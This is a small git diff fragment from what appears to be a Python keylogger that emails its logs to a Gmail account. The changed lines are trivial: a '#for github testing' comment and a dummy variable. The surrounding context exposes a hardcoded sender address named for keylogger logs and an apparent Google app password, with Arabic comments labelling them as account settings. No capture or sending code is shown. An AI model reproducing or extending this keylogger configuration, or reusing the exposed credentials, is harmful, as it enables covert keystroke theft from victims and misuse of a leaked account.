@@ -8,7 +8,8 @@ from email import encoders
 from datetime import datetime
 import threading
 import os
-
+#for github testing
+s=54
 # --- إعدادات الحساب ---
 EMAIL_ADDRESS = "keyloggerlog705@gmail.com"
 EMAIL_PASSWORD = "ibeqsgdcwnbufpjb"  # كلمة مرور التطبيقات من جوجل
